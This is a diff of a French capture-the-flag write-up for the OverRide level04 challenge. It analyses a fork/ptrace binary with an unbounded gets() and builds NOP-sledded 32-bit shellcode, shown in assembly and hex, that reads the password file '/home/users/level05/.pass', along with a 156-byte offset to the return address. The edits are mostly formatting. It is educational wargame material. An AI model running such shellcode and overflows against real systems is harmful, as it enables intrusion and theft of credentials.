@@ -98,7 +98,7 @@ End of assembler dump.
    0x080486d6 <+14>:    call   0x8048550 <fork@plt>
    0x080486db <+19>:    mov    %eax,0x8048550
 ```
-- On fork, le pid est stocké en `0x8048550`
+> On fork, le pid est stocké en `0x8048550`
 
 ```
    0x08048727 <+95>:    movl   $0x0,0xc(%esp)
@@ -107,14 +107,14 @@ End of assembler dump.
    0x0804873f <+119>:   movl   $0x0,(%esp)
    0x08048746 <+126>:   call   0x8048570 <ptrace@plt>
 ```
-- Le processus parrent trace le processus enfant
+> Le processus parrent trace le processus enfant
 
 ```
    0x08048757 <+143>:   lea    0x20(%esp),%eax
    0x0804875b <+147>:   mov    %eax,(%esp)
    0x0804875e <+150>:   call   0x80484b0 <gets@plt>
 ```
-- `<gets@plt>` prompt stdin, l'input est stocké en `0x20(%esp)`.
+> `<gets@plt>` prompt stdin, l'input est stocké en `0x20(%esp)`.
 
 - Donc le processus enfant nous laisse écrire sur sa stack sans limite, voyons ce que fait le processus parent:
 ```
@@ -122,7 +122,7 @@ End of assembler dump.
    0x0804876d <+165>:   mov    %eax,(%esp)
    0x08048770 <+168>:   call   0x80484f0 <wait@plt>
 ```
-- Attend que le processus enfant change d'état.
+> Attend que le processus enfant change d'état.
 ```
    0x08048775 <+173>:   mov    0x1c(%esp),%eax
    0x08048779 <+177>:   mov    %eax,0xa0(%esp)
@@ -159,7 +159,7 @@ End of assembler dump.
 ```
 > `0x804891d: "child is exiting..."`
 
-- Si le processus enfant s'est terminé, `puts("child is exiting...")` et retourne. Sinon, si le processus enfant n'a pas utilisé `execve()` (syscall 0xb), on repart pour un tour de boucle.
+> Si le processus enfant s'est terminé, `puts("child is exiting...")` et retourne. Sinon, si le processus enfant n'a pas utilisé `execve()` (syscall 0xb), on repart pour un tour de boucle.
 
 ```
    0x080487f6 <+302>:   movl   $0x8048931,(%esp)
@@ -171,8 +171,7 @@ End of assembler dump.
 ```
 > `0x8048500: "no exec() for you"`
 
-- If the child process used syscall `execve()`, `puts("no exec() for you")` and `kill(0x9, pid)`, so, our shellcode should not use execve.
-- Si le processus enfant utilise `execve()`, `puts("no exec() for you")` et `kill(0x9, pid)`, donc notre shellcode ne doit pas utiliser execve.
+> Si le processus enfant utilise `execve()`, `puts("no exec() for you")` et `kill(0x9, pid)`, donc notre shellcode ne doit pas call `execve()`.
 
 - Construisons notre shellcode, attention aux [bad characters](https://www.google.com/search?q=shellcode+bad+characters):
 ```asm
@@ -219,11 +218,15 @@ start:
         add    $0x1,%eax
         int    $0x80
 ```
-- Ça devrait ouvrir/lire "/home/users/level05/.pass" et l'afficher.
+- Ça devrait ouvrir et lire '/home/users/level05/.pass' puis afficher son contenu.
 
 ```
 level04@OverRide:~$ as -32 /tmp/shellcode.asm -o /tmp/shellcode.o
+```
+```
 level04@OverRide:~$ ld -m elf_i386 -o /tmp/shellcode /tmp/shellcode.o
+```
+```
 level04@OverRide:~$ objdump -d /tmp/shellcode
 /tmp/shellcode: file format elf32-i386
 Disassembly of section .text:
@@ -271,7 +274,7 @@ Disassembly of section .text:
 \x83\xe4\xf0\x83\xec\x40\x31\xc0\x83\xc0\x73\x89\x44\x24\x18\xc7\x44\x24\x14\x2e\x70\x61\x73\xc7\x44\x24\x10\x6c\x30\x35\x2f\xc7\x44\x24\x0c\x6c\x65\x76\x65\xc7\x44\x24\x08\x65\x72\x73\x2f\xc7\x44\x24\x04\x65\x2f\x75\x73\xc7\x04\x24\x2f\x68\x6f\x6d\x89\xe3\x31\xc9\x31\xd2\x31\xc0\x83\xc0\x05\xcd\x80\x89\xc3\x89\xe1\x31\xd2\x83\xc2\x28\x31\xc0\x83\xc0\x03\xcd\x80\x31\xdb\x83\xc3\x01\x89\xe1\x31\xd2\x83\xc2\x28\x31\xc0\x83\xc0\x04\xcd\x80
 ```
 
-- Toujours mieux avec quelques NOPs en plus (\x90):
+- Toujours mieux avec quelques `nop` en plus (\x90):
 ```
 level04@OverRide:~$ export SHELLCODE=$(echo -ne "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x83\xe4\xf0\x83\xec\x40\
 x31\xc0\x83\xc0\x73\x89\x44\x24\x18\xc7\x44\x24\x14\x2e\x70\x61\x73\xc7\x44\x24\x10\x6c\x30\x35\x2f\xc7\x44\x24\x0c\x
@@ -281,9 +284,9 @@ x31\xc0\x83\xc0\x73\x89\x44\x24\x18\xc7\x44\x24\x14\x2e\x70\x61\x73\xc7\x44\x24\
 ```
 
 
-- Notre buffer commence à `0x20(%esp)` et esp a été sub de 0xb0 bytes, et il y a un petit gap entre `0xb0(%esp)` et ebp à cause de `0x080486cd <+5>: and $0xfffffff0,%esp` et d'autres `push` qui ont été fait avant le `sub`.
+- Notre buffer commence à `0x20(%esp)` et `esp` a été `sub` de 0xb0 bytes, et il y a un petit gap entre `0xb0(%esp)` et `ebp` à cause de `0x080486cd <+5>: and $0xfffffff0,%esp` et d'autres `push` qui ont été fait avant le `sub`.
 
-- Nous trouvons un offset de 156 bytes avant que notre input commence à écraser le retour de la fonction (ebp+0x4). Donc:
+- Nous trouvons un offset de 156 bytes avant que notre input commence à écraser le retour de la fonction `(ebp+0x4)`. Du coup:
 ```c
 #include <stdio.h>
 #include <stdlib.h>
